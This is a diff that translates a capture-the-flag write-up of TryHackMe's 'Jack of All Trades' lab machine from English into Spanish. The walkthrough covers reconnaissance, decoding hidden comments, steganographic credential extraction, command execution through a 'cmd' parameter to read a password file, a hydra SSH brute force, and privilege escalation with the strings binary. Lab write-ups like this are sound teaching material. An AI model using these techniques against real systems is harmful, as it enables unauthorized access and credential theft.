@@ -1,22 +1,22 @@
 ---
-title : "Jack of All Trades - Write Up"
+title : "Jack of All Trades - Write Up - Español"
 date : 2021-07-04T14:31:31+02:00
 author : "Lanfran02"
 cover : "cover.jpeg"
 useRelativeCover : true
-description : "TryHackMe's easy level machine."
+description : "Máquina de nivel fácil en TryHackMe."
 tags : ["strings","stego","RCE","steghide","TryHackMe"]
 ---
 
-| Link | Level | Creator |
+| Link | Nivel | Creador |
 |------|-------|---------|
-| [Here](https://tryhackme.com/room/jackofalltrades)  | Easy  |  [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)  |
+| [Aquí](https://tryhackme.com/room/jackofalltrades)  | Fácil  |  [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)  |
 
-## Reconn
+## Reconocimiento
 
-As usual, using `nmap` we get the open ports of the machine. 
+Como de costumbre, usando `nmap` obtenemos los puertos abiertos de la máquina.
 
-But, we get something quite unusual.
+Pero obtenemos algo bastante inusual.
 
 ```bash
 ╰─ lanfran@parrot ❯ map 10.10.22.246                                                                                               ─╯
@@ -42,13 +42,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 60.85 seconds
 ```
 
-We get the port switched!
-The `SSH port it's the 80`.
-And the `web port it's the 22`.
+¡Conseguimos los puertos cambiados!
+El `puerto SSH es el 80`.
+Y el `puerto web es el 22`.
 
-It's a good way to minf\*ck some clueless people!
+¡Es una buena manera de pu&$\*!# a algunas personas despistadas!
 
-Let's scan the web server with `gobuster`
+Analicemos el servidor web con `gobuster`
 
 ```bash
 ╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/                                                                                                                              ─╯
@@ -69,7 +69,7 @@ Let's scan the web server with `gobuster`
 			<p>I make a lot of models myself, but I also do toys, like this one:</p>
 			<img src="assets/jackinthebox.jpg">
 			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
-			<!--  UmVtZW1iZX[REDACTED]Nzd29yZDogdT9XdEtTcmFxCg== -->
+			<!--  UmVtZW1iZX[REDACTADO]Nzd29yZDogdT9XdEtTcmFxCg== -->
 			<p>I hope you choose to employ me. I love making new friends!</p>
 			<p>Hope to see you soon!</p>
 			<p id="signature">Jack</p>
@@ -77,20 +77,21 @@ Let's scan the web server with `gobuster`
 	</body>
 </html>
 ```
-We have some nice info here:
-- We get an encoded text here.
-- We found a new endpoint `recovery.php`.
+Tenemos buena información aquí:
+- Obtenemos un texto codificado aquí.
+- Encontramos un nuevo endpoint `recovery.php`.
 
-1. We need to decode the text, so we are going to use [cyberchef](https://gchq.github.io/CyberChef/) !
-	To decode it we need to use `Base64`
+1. ¡Necesitamos decodificar el texto, así que vamos a usar [cyberchef](https://gchq.github.io/CyberChef/)!
+Para decodificarlo necesitamos usar `Base64`
 
-	And we get a message:
-	`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]`
+Y recibimos un mensaje:
+`Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTADO](
+¡Recuerde desearle lo mejor a Johny Graves con su búsqueda de trabajo en cripto! ¡Sus sistemas de codificación son increíbles! También debes recordar tu contraseña: [REDACTADO])`
 
-	Good! We have a password. Let's save it for later.
+¡Bien! Tenemos una contraseña. Dejémoslo para más tarde.
 
 
-2. Using curl to navigate, we get also a encoded text hidden in the soruce code
+2. Usando curl para navegar, obtenemos también un texto codificado oculto en el código fuente.
 ```bash
 ╰─ lanfran@parrot ❯ curl http://10.10.22.246:22/recovery.php                                                                                                                  ─╯
 		
@@ -113,30 +114,31 @@ We have some nice info here:
 			<input name="pass" type="password"><br>
 			<input type="submit" value="Submit">
 		</form>
-		<!-- GQ2TOMRXME3TE[REDACTED]TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
+		<!-- GQ2TOMRXME3TE[REDACTADO]TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
 		 
 	</body>
 </html>
 ```
 
-Let's use [cyberchef](https://gchq.github.io/CyberChef/) again to decode it!
+¡Usemos [cyberchef](https://gchq.github.io/CyberChef/) nuevamente para decodificarlo!
 
-The decode path is `Base32 -> Hex -> ROT13`.
+La ruta de decodificación es `Base32 -> Hex -> ROT13`.
 
-And we get a message:
-`Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`
+Y recibimos un mensaje:
+`Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`(
+`Recuerde que las credenciales para el inicio de sesión de recuperación están ocultas en la página de inicio. Sé lo olvidadiza que eres, así que aquí tienes una pista: bit.ly/2TvYQ2S`)
 
-## Foothold - User
+## Acceso inicial - Usuario
 
-Navigating to that link, we get a Wikipedia's Stegosauria page. Maybe the creator it's telling us to use steganography?
+Navegando a ese enlace, obtenemos una página de Stegosaurio de Wikipedia. ¿Quizás el creador nos está diciendo que usemos esteganografía?
 
-Let's download all the pictures of the webpage!
+¡Descarguemos todas las imágenes de la página web!
 
-After, running `steghide` with the password of the "1." point, we get a new file:
+Después, ejecute `steghide` con la contraseña del "1er" punto, obtenemos un nuevo archivo:
 
 ```bash
 ╰─ lanfran@parrot ❯ steghide extract -sf header.jpg                                                                                                                                       ─╯
-Enter passphrase: u[REDACTED]
+Enter passphrase: u[REDACTADO]
 the file "cms.creds" does already exist. overwrite ? (y/n) y
 wrote extracted data to "cms.creds".
 
@@ -144,19 +146,19 @@ wrote extracted data to "cms.creds".
 Here you go Jack. Good thing you thought ahead!
 
 Username: jackinthebox
-Password: [REDACTED]
+Password: [REDACTADO]
 ```
-Woohooo! We get the user's password for `recovery.php`!
+¡Woohooo! ¡Obtenemos la contraseña del usuario para `recovery.php`!
 
-So let's login now. [If you are getting the error "ERR_UNSAFE_PORT" on tyour browser, you have to enable the port 22. I google a way to fix it, in Brave/Chrome you have to pass the flag "--explicitly-allowed-ports=22"]
+Así que iniciemos sesión ahora. [Si recibe el error "ERR_UNSAFE_PORT" en su navegador, debe habilitar el puerto 22. Busco en Google una forma de solucionarlo, en Brave / Chrome debe pasar la bandera "--explicitly-allowed-ports=22 "]
 
-Great! We can even exploit the parameter `cmd` to do RCE.
+¡Estupendo! Incluso podemos aprovechar el parámetro `cmd` para hacer RCE.
 
-After digging around, we find a file with passwords.
+Después de buscar, encontramos un archivo con contraseñas.
 
 `http://10.10.194.240:22/nnxhweOV/index.php?cmd=cat%20%20/home/jacks_password_list`
 
-Download that file, and let's use it, along with `hydra` to bruteforce the SSH (Remember that's on port 80 :) )
+Descargue ese archivo y usémoslo, junto con `hydra` para forzar el SSH (recuerde que está en el puerto 80 :))
 
 ```bash
 ╰─ lanfran@parrot ❯ hydra -l jack -P pass.txt -s 80 ssh://10.10.22.246                                                                                                                    ─╯
@@ -166,14 +168,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-04 15:01:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:1/p:25), ~2 tries per task
 [DATA] attacking ssh://10.10.22.246:80/
-[80][ssh] host: 10.10.22.246   login: jack   password: [REDACTED]
+[80][ssh] host: 10.10.22.246   login: jack   password: [REDACTADO]
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 1 final worker threads did not complete until end.
 [ERROR] 1 target did not resolve or could not be connected
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-04 15:01:19
 ```
-Great, we have now the password, so let's SSH in.
+Genial, ahora tenemos la contraseña, así que vamos a SSH.
 
 ```bash
 ╰─ lanfran@parrot ❯ ssh jack@10.10.22.246 -p 80                                                                                                                                           ─╯
@@ -191,12 +193,12 @@ drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
 jack@jack-of-all-trades:~$ 
 ```
 
-Let's `cat` the user's fla... F\*ck, it's an image. Let's download it to our local machine and read/copy the flag from it.
-_I recommend using google translate's self image reader to copy the flag :)_
+Vamos a usar "cat" para leer la flag del usua... La p\*\*\*, es una imagen. Descargámoslo a nuestra máquina local y leamos/copiemos la bandera.
+_Recomiendo usar el lector de autoimagen del traductor de Google para copiar la bandera :)_
 
 ## Root
 
-Scanning the machine, we found the binary `strings` that's owned by root and has the Sticky bit, so we can use it to read the root's flag.
+Al escanear la máquina, encontramos que el binario `strings` tiene el Sticky bit, por lo que podemos usarlo para leer el flag de root.
 
 ```bash
 jack@jack-of-all-trades:~$ ls -la /usr/bin/strings 
@@ -208,9 +210,9 @@ ToDo:
 3.Meet up with Johny for a pint or two
 4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
 5.Remember to finish that contract for Lisa.
-6.Delete this: securi-tay2020_{[REDACTED]}
+6.Delete this: securi-tay2020_{[REDACTADO]}
 ```
 
-And we "rooted" the machine!
+¡Y hemos "rooteado" la máquina!
 
-That's all from my side, hope you find this helpful!
+Eso es todo de mi parte, ¡espero que lo encuentre útil!
